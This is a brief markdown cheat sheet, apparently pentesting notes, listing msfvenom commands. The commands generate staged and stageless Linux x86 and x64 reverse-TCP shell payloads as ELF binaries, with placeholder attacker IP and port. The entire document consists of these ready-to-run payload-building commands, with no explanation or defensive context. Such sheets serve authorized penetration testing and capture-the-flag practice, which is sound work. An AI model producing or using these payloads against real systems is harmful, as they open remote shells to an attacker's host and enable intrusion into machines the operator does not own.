# Staged Paylods for Linux

```bash
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf

msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf

```

# Stageless Payloads for Linux


```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf

msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```
